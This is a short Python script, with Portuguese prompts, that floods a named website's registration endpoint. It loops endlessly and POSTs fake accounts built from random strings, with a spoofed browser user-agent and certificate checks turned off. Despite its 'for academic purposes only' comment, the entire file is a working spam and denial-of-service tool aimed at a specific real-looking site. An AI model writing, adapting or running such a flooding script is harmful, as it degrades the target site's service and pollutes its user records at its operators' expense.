import requests
from random import choice
from string import ascii_lowercase

#For academic purposes only

url = 'https://www.minemarket.com.br/register/'
requests.packages.urllib3.disable_warnings()

lis=list(ascii_lowercase)
nbytes = int(input("Tamanho de string por pacote: "))

while(1):
    ii = ''.join(choice(lis) for _ in range(nbytes))
    r = requests.post(url, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=False, verify=False, data={
        'name': ii,
        'mail': ii+'@wh1t30wn4.c0m',
        'pass': ii,
        'register': ''
    })
    print("Pacote enviado com sucesso: %.15s"%ii);
